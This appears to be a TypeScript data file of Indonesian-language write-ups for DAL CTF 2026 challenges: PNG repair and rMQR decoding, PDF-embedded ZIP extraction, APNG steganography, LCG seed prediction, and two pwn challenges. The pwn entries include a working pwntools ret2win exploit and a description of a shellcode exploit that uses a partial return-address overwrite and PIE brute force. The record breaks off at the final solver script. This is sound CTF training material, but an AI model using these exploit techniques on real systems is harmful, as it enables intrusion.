import type { WriteUp } from "../types";

export const dalCtf2026Writeups: WriteUp[] = [
  {
    "id": "dalctf2026-forensic-spoiledcheesepull",
    "title": "Spoiled Cheese Pull",
    "ctfName": "DAL CTF 2026",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Spoiled Cheese Pull",
    "problemDescription": "Artefak yang diberikan adalah `chall(1).zip`. Di dalamnya hanya ada satu file bernama `chall.png`, tetapi hasil `file` menunjukkan bahwa file tersebut tidak benar-benar PNG. Header awalnya dibuat seperti JPEG/JFIF, sementara isi setelahnya ternyata mengikuti struktur PNG yang sengaja dirusak.\n\nFlag ditemukan setelah memperbaiki struktur PNG, membaca gambar rMQR yang muncul, lalu mengekstrak payload byte mode dari simbol rMQR tersebut.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Hasil penting:\n\n\n\nNama file adalah `.png`, tetapi signature awalnya JPEG. String `IHET`, `ISAD`, dan `SEND` terlihat mencurigakan karena sangat mirip dengan chunk PNG asli:\n\n- `IHET` seharusnya `IHDR`\n- `ISAD` seharusnya `IDAT`\n- `SEND` seharusnya `IEND`\n\nCRC chunk-nya juga cocok dengan nama chunk PNG yang benar, bukan nama yang rusak. Jadi file ini adalah PNG yang disamarkan dan chunk type-nya diganti.",
        "code": "file chall\\(1\\).zip\nunzip -l chall\\(1\\).zip\nunzip chall\\(1\\).zip\nfile chall.png\nstrings -a chall.png"
      },
      {
        "title": "Perbaikan PNG",
        "content": "Struktur yang dipulihkan:\n\n1. Ganti fake JPEG/JFIF prefix dengan PNG signature.\n2. Buat ulang chunk pertama sebagai `IHDR` dengan panjang 13 byte.\n3. Ganti chunk `ISAD` menjadi `IDAT`.\n4. Ganti chunk `SEND` menjadi `IEND`.\n\nScript `solve.py` melakukan perbaikan ini secara otomatis dan menghasilkan `fixed.png`.\n\nSetelah diperbaiki:\n\n\n\nHasilnya:\n\n\n\nGambar yang muncul adalah barcode panjang berbentuk rMQR berukuran 7 x 77 module.",
        "code": "file fixed.png"
      },
      {
        "title": "Decode rMQR",
        "content": "Simbol pada gambar adalah rMQR versi `R7x77`. Dari format information, level ECC yang dipakai adalah `M`.\n\nLangkah decode yang dilakukan:\n\n1. Ambil grid hitam-putih dari gambar. Ukuran gambar 810 x 110, bounding box barcode 770 x 70, sehingga satu module berukuran 10 px.\n2. Bentuk grid 7 baris x 77 kolom.\n3. Tandai area non-data: finder pattern, sub-finder, corner finder, timing, alignment, dan format information.\n4. Baca data region memakai pola placement rMQR dari kanan ke kiri.\n5. Balikkan mask rMQR:\n\n\n\n6. Ekstrak 32 codeword.\n7. Parse payload rMQR:\n   - mode `011` = byte mode\n   - character count `10011` = 19 byte\n   - payload 19 byte menghasilkan flag.\n\nPayload yang terbaca:",
        "code": "(y // 2 + x // 3) % 2 == 0"
      },
      {
        "title": "Cara menjalankan solver",
        "content": "Output:",
        "code": "python3 solve.py chall.png"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport sys, struct, zlib\r\n\r\nPNG_SIG = b'\\x89PNG\\r\\n\\x1a\\n'\r\n\r\ndef repair_png(inp: Path, out: Path) -> bytes:\r\n    b = inp.read_bytes()\r\n    # The image is a valid PNG with a fake JPEG/JFIF start and chunk type names altered:\r\n    # IHET -> IHDR, ISAD -> IDAT, SEND -> IEND. CRCs still match the real PNG chunk names.\r\n    png = bytearray()\r\n    png += PNG_SIG\r\n    png += (13).to_bytes(4, 'big') + b'IHDR' + b[16:33]\r\n\r\n    pos = 33\r\n    length = int.from_bytes(b[pos:pos+4], 'big')\r\n    png += b[pos:pos+4] + b'IDAT' + b[pos+8:pos+8+length] + b[pos+8+length:pos+12+length]\r\n\r\n    pos += 12 + length\r\n    length = int.from_bytes(b[pos:pos+4], 'big')\r\n    png += b[pos:pos+4] + b'IEND' + b[pos+8:pos+8+length] + b[pos+8+length:pos+12+length]\r\n    out.write_bytes(png)\r\n    return bytes(png)\r\n\r\ndef read_grid_from_png(path: Path):\r\n    try:\r\n        from PIL import Image\r\n    except ImportError:\r\n        raise SystemExit('Pillow is required: pip install pillow')\r\n    im = Image.open(path).convert('L')\r\n    w, h = im.size\r\n    pix = im.load()\r\n    xs, ys = [], []\r\n    for y in range(h):\r\n        for x in range(w):\r\n            if pix[x, y] < 128:\r\n                xs.append(x); ys.append(y)\r\n    x0, x1, y0, y1 = min(xs), max(xs), min(ys), max(ys)\r\n    # This rMQR symbol is R7x77 and rendered at 10 px/module.\r\n    module = (y1 - y0 + 1) // 7\r\n    grid = []\r\n    for r in range(7):\r\n        row = []\r\n        for c in range(77):\r\n            black = 0\r\n            for yy in range(y0 + r*module, y0 + (r+1)*module):\r\n                for xx in range(x0 + c*module, x0 + (c+1)*module):\r\n                    black += pix[xx, yy] < 128\r\n            row.append(1 if black > (module*module)//2 else 0)\r\n        grid.append(row)\r\n    return grid\r\n\r\ndef mask(x, y):\r\n    return (y // 2 + x // 3) % 2 == 0\r\n\r\ndef reserved_modules(width=77, height=7):\r\n    # Recreate the reserved areas for rMQR R7x77: finder, sub-finder, corner finder,\r\n    # alignment/timing, and format information. Only data cells remain unreserved.\r\n    r = [[False]*width for _ in range(height)]\r\n    def mark(x,y):\r\n        if 0 <= x < width and 0 <= y < height:\r\n            r[y][x] = True\r\n    # left 7x7 finder + separator column 7\r\n    for y in range(7):\r\n        for x in range(7): mark(x,y)\r\n        mark(7,y)\r\n    # right bottom 5x5 sub finder\r\n    for i in range(5):\r\n        for j in range(5): mark(width-1-j, height-1-i)\r\n    # corner finder bits\r\n    for x in [0,1,2]: mark(x,height-1)\r\n    mark(width-1,0); mark(width-2,0); mark(width-1,1); mark(width-2,1)\r\n    # alignment patterns for width 77 (from ISO rMQR placement; centers at x=25 and x=51)\r\n    for cx in [25, 51]:\r\n        for j in range(cx-1, cx+2):\r\n            for y in [0,1,2,height-3,height-2,height-1]: mark(j,y)\r\n    # timing rows top/bottom and timing columns at x=0,width-1,alignment centers\r\n    for x in range(width): mark(x,0); mark(x,height-1)\r\n    for x in [0,width-1,25,51]:\r\n        for y in range(height): mark(x,y)\r\n    # format info near both finder patterns\r\n    for n in range(18):\r\n        x = 8 + n//5; y = 1 + n%5; mark(x,y)\r\n    for n in range(15):\r\n        x = width-1-7 + n//5; y = height-1-5 + n%5; mark(x,y)\r\n    for x,y in [(width-1-4, height-1-5), (width-1-3, height-1-5), (width-1-2, height-1-5)]: mark(x,y)\r\n    return r\r\n\r\ndef extract_codewords(grid):\r\n    width, height = 77, 7\r\n    res = reserved_modules(width, height)\r\n    bits = []\r\n    dy = -1\r\n    cx, cy = width - 2, height - 6\r\n    total_bits = 32 * 8\r\n    remainder_bits = 5\r\n    while True:\r\n        for x in (cx, cx-1):\r\n            if not res[cy][x]:\r\n                if len(bits) < total_bits:\r\n                    bits.append(grid[cy][x] ^ (1 if mask(x, cy) else 0))\r\n                else:\r\n                    remainder_bits -= 1\r\n                if len(bits) == total_bits and remainder_bits == 0:\r\n                    break\r\n        if len(bits) == total_bits and remainder_bits == 0:\r\n            break\r\n        if dy < 0 and cy == 1:\r\n            cx -= 2; dy = 1\r\n        elif dy > 0 and cy == height - 2:\r\n            cx -= 2; dy = -1\r\n        else:\r\n            cy += dy\r\n    return [int(''.join(map(str, bits[i:i+8])), 2) for i in range(0, total_bits, 8)]\r\n\r\ndef decode_payload(codewords):\r\n    bits = ''.join(f'{b:08b}' for b in codewords)\r\n    mode = bits[:3]\r\n    if mode != '011':\r\n        raise ValueError(f'unexpected rMQR mode {mode}, expected byte mode 011')\r\n    count = int(bits[3:8], 2)  # R7x77 byte mode count indicator is 5 bits\r\n    idx = 8\r\n    data = bytes(int(bits[idx+i:idx+i+8], 2) for i in range(0, count*8, 8))\r\n    return data.decode('utf-8')\r\n\r\ndef main():\r\n    inp = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('chall.png')\r\n    fixed = Path('fixed.png')\r\n    repair_png(inp, fixed)\r\n    grid = read_grid_from_png(fixed)\r\n    codewords = extract_codewords(grid)\r\n    flag = decode_payload(codewords)\r\n    print(flag)\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalCTF{WhY_$O_L0N5}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-forensic-warmerup",
    "title": "Warmerer Up - DalCTF 2026",
    "ctfName": "DAL CTF 2026",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Warmerer Up - DalCTF 2026",
    "problemDescription": "",
    "tools": [],
    "analysis": "1.  **Identifikasi File**: File `rules2.pdf` adalah dokumen PDF standar. Namun, ukurannya cukup besar (~5.1 MB) untuk sebuah dokumen yang hanya berisi 3 halaman teks.\n2.  **Pengecekan Teks**: Menggunakan `pdftotext` menunjukkan isi aturan CTF biasa. Di akhir teks terdapat string mencurigakan: `teapot_2026`.\n3.  **Struktur PDF**: Saat memeriksa struktur internal PDF menggunakan `strings` atau hex editor, ditemukan banyak objek stream yang diawali dengan label `@@0:`, `@@1:`, dst.\n    *   Ada total 360 chunk (0-359).\n    *   Isi chunk tersebut terlihat seperti data Base64.\n    *   Decode awal pada chunk 0 (`@@0:`) menunjukkan header file ZIP (`PK\\x03\\x04`).",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Challenge ini memberikan sebuah file PDF bernama `rules2.pdf`. Deskripsinya menyinggung tentang aturan yang diberikan berulang kali (\"What, what, the rules again again?\")."
      },
      {
        "title": "Langkah Penyelesaian",
        "content": "1.  **Ekstraksi Data**: Dibuat script Python (`solve.py`) untuk mengambil semua data dari label `@@i:` di dalam file PDF, menggabungkannya, dan men-decode-nya dari Base64.\n2.  **Reassemblasi ZIP**: Hasil decode Base64 disimpan sebagai `extracted.zip`.\n3.  **Membuka ZIP**: File `extracted.zip` ternyata diproteksi password. Menggunakan petunjuk `teapot_2026` dari teks PDF sebagai password, file di dalamnya berhasil diekstrak. File tersebut bernama `image.sif`.\n4.  **Analisis SIF**: File `image.sif` adalah *Singularity Image Format*. Di dalamnya terdapat sistem file terkompresi.\n5.  **Ekstraksi SquashFS**: Menggunakan `binwalk`, ditemukan header SquashFS pada offset `36864`. File sistem ini kemudian diekstrak menggunakan `unsquashfs`.\n6.  **Menemukan Flag**: Di dalam hasil ekstraksi SquashFS, ditemukan file `flag.txt` di direktori `/home/flag/flag.txt`."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import re\r\nimport base64\r\nimport os\r\nimport subprocess\r\n\r\ndef solve():\r\n    pdf_path = 'rules2.pdf'\r\n    zip_path = 'extracted.zip'\r\n    password = 'teapot_2026'\r\n    sif_path = 'image.sif'\r\n    \r\n    # 1. Extract chunks from PDF\r\n    print(\"[*] Extracting chunks from PDF...\")\r\n    with open(pdf_path, 'rb') as f:\r\n        content = f.read().decode('latin-1')\r\n    \r\n    chunks = {}\r\n    pattern = re.compile(r'@@(\\d+):')\r\n    matches = list(pattern.finditer(content))\r\n    for i in range(len(matches)):\r\n        chunk_id = int(matches[i].group(1))\r\n        start = matches[i].end()\r\n        if i + 1 < len(matches):\r\n            end = matches[i+1].start()\r\n            sub_content = content[start:end]\r\n            stream_end = sub_content.find('endstream')\r\n            if stream_end != -1:\r\n                end = start + stream_end\r\n            else:\r\n                dict_end = sub_content.find('>>')\r\n                if dict_end != -1:\r\n                    end = start + dict_end\r\n        else:\r\n            end = content.find('endstream', start)\r\n        \r\n        data = content[start:end]\r\n        data = re.sub(r'[^A-Za-z0-9+/=]', '', data)\r\n        chunks[chunk_id] = data\r\n\r\n    sorted_ids = sorted(chunks.keys())\r\n    full_base64 = \"\".join(chunks[i] for i in sorted_ids)\r\n    \r\n    # Handle potential base64 length issues\r\n    missing_padding = len(full_base64) % 4\r\n    if missing_padding == 1:\r\n        full_base64 = full_base64[:-1]\r\n    elif missing_padding > 1:\r\n        full_base64 += '=' * (4 - missing_padding)\r\n        \r\n    decoded_zip = base64.b64decode(full_base64)\r\n    with open(zip_path, 'wb') as f:\r\n        f.write(decoded_zip)\r\n    print(f\"[+] Reassembled ZIP saved to {zip_path}\")\r\n\r\n    # 2. Extract image.sif from ZIP\r\n    print(\"[*] Unzipping ZIP...\")\r\n    subprocess.run(['unzip', '-P', password, '-o', zip_path], check=True)\r\n    print(f\"[+] Extracted {sif_path}\")\r\n\r\n    # 3. Extract SquashFS from SIF\r\n    print(\"[*] Extracting SquashFS from SIF...\")\r\n    # Offset found from binwalk: 36864\r\n    subprocess.run(['unsquashfs', '-f', '-d', 'squashfs-root', '-o', '36864', sif_path], check=True)\r\n    \r\n    # 4. Read flag\r\n    flag_path = 'squashfs-root/home/flag/flag.txt'\r\n    if os.path.exists(flag_path):\r\n        with open(flag_path, 'r') as f:\r\n            flag = f.read().strip()\r\n            print(f\"\\n[!] FLAG: {flag}\")\r\n    else:\r\n        print(\"[-] Flag not found in extracted filesystem.\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{n0w_y0u_r3ally_b3tt3r_kn0w_th3_rul3s}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-misc-cardcounting",
    "title": ": Card Counting - DalCTF 2026",
    "ctfName": "DAL CTF 2026",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge : Card Counting - DalCTF 2026",
    "problemDescription": "",
    "tools": [],
    "analysis": "Dari file `game.js` yang disediakan, kita bisa melihat logika permainan:\n\n1.  **PRNG (Pseudo-Random Number Generator):**\n    Permainan menggunakan LCG (Linear Congruential Generator) untuk menentukan kartu yang muncul.\n    ```javascript\n    const s=1664525;\n    const i=1013904223;\n    const o=2147483647;\n    let r=...; // Seed didapat dari server\n    ```\n\n2.  **Penentuan Kartu:**\n    Fungsi `h()` digunakan untuk menghasilkan indeks kartu:\n    ```javascript\n    function h(){\n        let t=63&r>>4;\n        let e=t&15;\n        if(e>9){e=16-e}\n        let n=3&t>>4;\n        r=r*s+i&o;\n        return(n+e*4+16)%40;\n    }\n    ```\n    Kartu-kartu ini digambar dari sebuah sprite sheet `cards.png` yang berisi 40 kartu.\n\n3.  **Logika Skor/Nilai Kartu:**\n    Melalui eksperimen dan pengumpulan data (menggunakan script `collect_data.py`), saya menemukan bahwa \"sum of all cards\" yang diminta oleh server adalah total nilai dari `e + 1` untuk setiap kartu yang diproses oleh fungsi `h()`. Variabel `e` ini adalah nilai antara 0-9 yang dihitung dari seed `r` sebelum seed tersebut diupdate untuk iterasi berikutnya.\n\n4.  **Level Game:**\n    Ada 7 level dengan jumlah kartu yang berbeda-beda:\n    - Level 1: 4 kartu\n    - Level 2: 8 kartu\n    - Level 3: 25 kartu\n    - Level 4: 80 kartu\n    - Level 5: 50 kartu\n    - Level 6: 100 kartu\n    - Level 7: 1000 kartu",
    "solution": [
      {
        "title": "Deskripsi",
        "content": "Challenge ini adalah mini-game \"Card Counting\". Kita diminta untuk menebak jumlah total nilai kartu yang muncul di layar dalam beberapa level. Level-level awal cukup mudah, tapi level terakhir memunculkan 1000 kartu dengan gerakan yang sangat cepat dan acak, sehingga tidak mungkin dilakukan secara manual."
      },
      {
        "title": "Eksploitasi",
        "content": "Karena seed awal diberikan oleh server melalui `/api/start_game` dan setiap jawaban yang benar akan memberikan seed baru untuk level berikutnya, kita bisa mensimulasikan seluruh jalannya permainan secara lokal dan mengirimkan jawaban yang tepat secara otomatis.\n\nLangkah-langkah exploit:\n1. Hubungi `/api/start_game` untuk mendapatkan seed awal.\n2. Simulasikan fungsi `h()` sebanyak jumlah kartu di level tersebut.\n3. Hitung total sum dari `e + 1`.\n4. Kirim hasil ke `/api/submit`.\n5. Ambil seed baru dari response dan ulangi sampai level 7 selesai.\n\nScript `solve.py` berhasil menyelesaikan semua level dan mendapatkan flag."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import requests\r\n\r\ns_const = 1664525\r\ni_const = 1013904223\r\no_const = 2147483647\r\n\r\ndef h(r):\r\n    t = 63 & (r >> 4)\r\n    e = t & 15\r\n    if e > 9:\r\n        e = 16 - e\r\n    n = 3 & (t >> 4)\r\n    new_r = (r * s_const + i_const) & o_const\r\n    val = (n + e * 4 + 16) % 40\r\n    return val, e, new_r\r\n\r\ndef get_level_sum(seed, count):\r\n    current_r = seed\r\n    total_sum = 0\r\n    for _ in range(count):\r\n        _, e, current_r = h(current_r)\r\n        total_sum += (e + 1)\r\n    return total_sum, current_r\r\n\r\nurl = \"https://dalctf-card-counting-204-64616c.instancer.dalctf2026.com\"\r\nsession = requests.Session()\r\n\r\n# Start Game\r\nresp = session.get(f\"{url}/api/start_game\")\r\ndata = resp.json()\r\nseed = data['seed']\r\nprint(f\"Start seed: {seed}\")\r\n\r\n# Levels\r\n# M: 4\r\n# y: 8\r\n# _: 25\r\n# g: 16*5 = 80\r\n# p: 50\r\n# v: 100\r\n# I: 1000\r\nlevel_counts = [4, 8, 25, 80, 50, 100, 1000]\r\n\r\nfor i, count in enumerate(level_counts):\r\n    level_sum, _ = get_level_sum(seed, count)\r\n    print(f\"Level {i+1} ({count} cards), Sum: {level_sum}\")\r\n    \r\n    resp = session.post(f\"{url}/api/submit\", data={'answer': level_sum})\r\n    result = resp.json()\r\n    print(f\"Result: {result}\")\r\n    \r\n    if 'error' in result and result['error']:\r\n        print(f\"Error: {result['error']}\")\r\n        break\r\n    \r\n    if 'flag' in result and result['flag']:\r\n        print(f\"FLAG: {result['flag']}\")\r\n        break\r\n    \r\n    if 'seed' in result:\r\n        seed = result['seed']\r\n    else:\r\n        print(\"No seed in response, game might be over or failed.\")\r\n        break"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{y0vre_re@dy_for_p0k3r}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-misc-someonesaidsteg",
    "title": ": someone said steg?",
    "ctfName": "DAL CTF 2026",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge : someone said steg?",
    "problemDescription": "",
    "tools": [],
    "analysis": "1.  **Identifikasi File**: \n    Menggunakan perintah `file` dan `exiftool`, diketahui bahwa `chall.png` adalah sebuah **APNG (Animated PNG)** yang terdiri dari 16 frame.\n    \n2.  **Pemeriksaan Metadata & Strings**: \n    Tidak ditemukan informasi berguna pada metadata atau hasil perintah `strings`.\n\n3.  **Analisis Steganografi**:\n    - Menggunakan `zsteg` untuk memeriksa LSB steganografi.\n    - `zsteg` menunjukkan adanya data mencurigakan pada chunk `fdAT` (chunk data frame APNG).\n    - Terlihat bahwa setiap frame memiliki satu karakter yang tersembunyi di awal data zlib yang dikompresi.\n    \n4.  **Ekstraksi Data**:\n    Setiap frame dalam APNG disimpan dalam chunk `IDAT` (frame pertama) dan `fdAT` (frame berikutnya). \n    Dengan mendekompresi data zlib dari setiap chunk tersebut, kita dapat melihat data pixel mentah.\n    \n    Data pixel untuk gambar ini menggunakan format **RGBA** (4 byte per pixel).\n    Setelah diperiksa, ditemukan bahwa nilai **Alpha** (byte ke-4) dari pixel pertama (0,0) di setiap frame berisi satu karakter dari flag.\n\n    Frame ke- | Chunk | Nilai Alpha Pixel (0,0) | Karakter\n    --- | --- | --- | ---\n    0 | IDAT | 100 | d\n    1 | fdAT | 97 | a\n    2 | fdAT | 108 | l\n    3 | fdAT | 99 | c\n    4 | fdAT | 116 | t\n    5 | fdAT | 102 | f\n    6 | fdAT | 123 | {\n    7 | fdAT | 112 | p\n    8 | fdAT | 105 | i\n    9 | fdAT | 97 | a\n    10 | fdAT | 110 | n\n    11 | fdAT | 111 | o\n    12 | fdAT | 109 | m\n    13 | fdAT | 97 | a\n    14 | fdAT | 110 | n\n    15 | fdAT | 125 | }",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Challenge ini memberikan sebuah file gambar `chall.png` dengan deskripsi \"everyone <3s steg right?\"."
      },
      {
        "title": "Script Solve",
        "content": "Berikut adalah script Python untuk mengekstrak flag secara otomatis:",
        "code": "import struct\nimport zlib\n\ndef solve():\n    flag = \"\"\n    with open('chall.png', 'rb') as f:\n        f.read(8) # PNG Magic\n        while True:\n            chunk_header = f.read(8)\n            if not chunk_header: break\n            length, name = struct.unpack('>I4s', chunk_header)\n            data = f.read(length)\n            f.read(4) # CRC\n            if name == b'IDAT':\n                d = zlib.decompress(data)\n                flag += chr(d[4]) # Alpha channel pixel (0,0)\n            elif name == b'fdAT':\n                d = zlib.decompress(data[4:])\n                flag += chr(d[4]) # Alpha channel pixel (0,0)\n    print(flag)\n\nif __name__ == \"__main__\":\n    solve()"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import struct\r\nimport zlib\r\n\r\ndef solve():\r\n    flag = \"\"\r\n    with open('chall.png', 'rb') as f:\r\n        f.read(8) # PNG Magic\r\n        while True:\r\n            chunk_header = f.read(8)\r\n            if not chunk_header: break\r\n            length, name = struct.unpack('>I4s', chunk_header)\r\n            data = f.read(length)\r\n            f.read(4) # CRC\r\n            if name == b'IDAT':\r\n                d = zlib.decompress(data)\r\n                flag += chr(d[4]) # Alpha channel of pixel (0,0)\r\n            elif name == b'fdAT':\r\n                d = zlib.decompress(data[4:])\r\n                flag += chr(d[4]) # Alpha channel of pixel (0,0)\r\n    print(flag)\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{pianoman}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-pwn-slotmachine",
    "title": "Slot Machine",
    "ctfName": "DAL CTF 2026",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini ternyata sederhana begitu binary-nya dibongkar:",
    "problemDescription": "Challenge ini ternyata sederhana begitu binary-nya dibongkar:\n\n- ELF 64-bit AMD64\n- No PIE\n- No canary\n- Stack executable\n- Binary tidak stripped\n\nJadi target utamanya bukan ROP yang rumit, tapi `ret2win` lewat stack overflow di `gets()`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Temuan",
        "content": "Di `game_loop()` ada:\n\n\n\nItu langsung memberi kontrol ke stack buffer tanpa batas panjang. Dari disassembly, buffer ada di `[rbp-0x20]`, jadi offset ke saved RIP adalah:\n\n- `0x20` byte buffer\n- `+ 8` byte saved RBP\n- total `40` byte ke saved RIP\n\nFungsi yang kita tuju adalah `jackpot()` di alamat `0x401206`.",
        "code": "char cmd[32];\ngets(cmd);"
      },
      {
        "title": "Kenapa partial overwrite",
        "content": "Karena binary ini non-PIE, alamat return dari `game_loop()` dan alamat `jackpot()` sama-sama ada di area:\n\n`0x000000000040xxxx`\n\nReturn address asli dari `game_loop()` adalah `0x4017a5`, sedangkan `jackpot()` ada di `0x401206`.\n\nArtinya kita cukup mengubah 3 byte terbawah return address:\n\n- dari `a5 17 40`\n- jadi `06 12 40`\n\nDengan begitu kita tidak perlu menulis byte `0x00`, yang berguna kalau transport remote atau wrapper TTY mempersulit byte NUL."
      },
      {
        "title": "Alur Exploit",
        "content": "1. Kirim payload:\n   - `A` sebanyak 40 byte\n   - lalu 3 byte alamat `jackpot`\n2. Tutup sisi kirim socket agar `gets()` mendapat EOF\n3. `game_loop()` return\n4. Control flow lompat ke `jackpot()`\n5. Program membuka `flag.txt` dan mencetak flag"
      },
      {
        "title": "File",
        "content": "- [`exploit.py`](./exploit.py)"
      },
      {
        "title": "Cara Jalan",
        "content": "Local:\n\n\n\nRemote:\n\n\n\nKalau mau set host/port sendiri:\n\n\n\nScript akan coba beberapa pola kirim payload:\n\n1. Overflow 1 line lalu `exit`\n1. `exit\\x00` + overflow penuh\n1. Overflow penuh lalu EOF socket",
        "code": "python3 exploit.py"
      },
      {
        "title": "Catatan",
        "content": "Local test di folder ini memakai `flag.txt` dummy supaya jalur `jackpot()` bisa langsung dibuktikan. Saat remote hidup lagi, script yang sama tinggal dijalankan tanpa perubahan."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = elf = ELF(\"./Chall\")\r\n# context.log_level = 'debug'\r\n\r\ndef get_io():\r\n    if args.REMOTE:\r\n        return remote(\"instancer.dalctf2026.com\", 49480)\r\n    else:\r\n        return process(\"./Chall\")\r\n\r\n# jackpot = 0x401206\r\n# ret = 0x40101a\r\n\r\ndef solve():\r\n    io = get_io()\r\n    \r\n    # Offset to return address is 40\r\n    # Payload: \"exit\\x00\" + padding + ret_gadget + jackpot\r\n    # Using \"exit\\x00\" to trigger the return immediately\r\n    \r\n    ret_gadget = 0x40101a\r\n    jackpot_addr = elf.sym['jackpot']\r\n    \r\n    payload = b\"exit\\x00\"\r\n    payload += b\"A\" * (40 - len(payload))\r\n    payload += p64(ret_gadget)\r\n    payload += p64(jackpot_addr)\r\n    \r\n    io.sendlineafter(b\"> \", payload)\r\n    \r\n    try:\r\n        io.recvuntil(b\"Flag: \")\r\n        flag = io.recvline().decode().strip()\r\n        print(f\"FLAG: {flag}\")\r\n    except EOFError:\r\n        print(\"Failed to get flag\")\r\n    \r\n    io.close()\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-pwn-videokilledthepwnstar",
    "title": "Video Killed the PWN Star",
    "ctfName": "DAL CTF 2026",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini kelihatannya seperti web upload biasa untuk membaca metadata video, tapi inti bug-nya ada di binary `video_processor`.",
    "problemDescription": "Di `parse_uuid_raw()` ada stack buffer `uuid_buffer[256]`. Program membaca box `uuid` dari file MP4, lalu kalau UUID-nya cocok dengan `TARGET_UUID`, ukuran data dihitung dari field ukuran box:\n\n```c\nuint32_t data_len = box_size - 24;\nfread(uuid_buffer, 1, data_len, fp);\n```\n\nTidak ada pengecekan bahwa `data_len <= 256`, jadi isi box `uuid` bisa menimpa saved `rbp` dan saved `rip`.",
    "tools": [],
    "analysis": "Setelah `fread()` overflow selesai, jalur sukses fungsi masih melakukan:\n\n```asm\n1474: lea -0x110(%rbp), %rax\n...\n151e: leave\n151f: ret\n```\n\nArtinya sebelum `ret`, register `rax` masih menunjuk ke `uuid_buffer`, yaitu buffer kita di stack. Karena stack executable, cara paling murah adalah mengarahkan return ke gadget `call rax` di binary. Dengan begitu shellcode di `uuid_buffer` langsung dijalankan.\n\nMasalahnya ada dua:\n\n1. Binary pakai PIE, jadi alamat absolut gadget berubah.\n2. Kita hanya menimpa 2 byte terendah dari saved `rip`, sehingga kita bergantung pada 4 bit acak dari base PIE.\n\nOffset gadget yang dipakai adalah:\n\n- `call rax` di `0x1014`\n\nKarena page alignment PIE berbentuk `...000`, 2 byte terendah gadget yang mungkin hanyalah:\n\n- `0x1014`\n- `0x2014`\n- `0x3014`\n- ...\n- `0xf014`\n- `0x0014`\n\nTotal cuma 16 kemungkinan. Satu request remote bisa gagal kalau nibble PIE tidak cocok, jadi solver cukup brute-force 16 nilai ini berulang sampai satu request kena kombinasi yang benar.",
    "solution": [
      {
        "title": "Recon",
        "content": "`checksec` memberi hasil penting berikut:\n\n- PIE enabled\n- No canary\n- GNU_STACK RWE, jadi stack executable\n- IBT dan SHSTK terpasang di note ELF\n\nOffset hasil cyclic:\n\n- saved `rbp`: 272 byte\n- saved `rip`: 280 byte"
      },
      {
        "title": "Kenapa shellcode perlu `endbr64`",
        "content": "Binary dibangun dengan IBT. Target indirect branch yang valid perlu diawali instruksi `endbr64`, jadi shellcode dimulai dengan opcode itu supaya `call rax` tidak langsung ditolak."
      },
      {
        "title": "Shellcode",
        "content": "Payload memakai `pwntools.shellcraft.cat('/flag.txt')` lalu `exit(0)`. Jadi kalau eksekusi berhasil, isi flag dikirim ke stdout proses, dan aplikasi web menampilkan stdout itu di tag `<pre>`."
      },
      {
        "title": "Alur solver",
        "content": "1. Siapkan MP4 valid berdurasi 6 detik.\n2. Tempel box `uuid` dengan UUID target.\n3. Isi data box dengan:\n   - shellcode\n   - padding sampai offset 272\n   - dummy saved `rbp`\n   - 2 byte partial overwrite saved `rip`\n4. Upload berulang ke `/upload`.\n5. Parse HTML response dan ambil string berbentuk `xxx{...}`."
      },
      {
        "title": "Menjalankan solver",
        "content": "Aktifkan environment lalu jalankan:\n\n\n\nKalau request pertama belum kena nibble PIE yang pas, script akan lanjut brute-force sampai flag muncul.",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
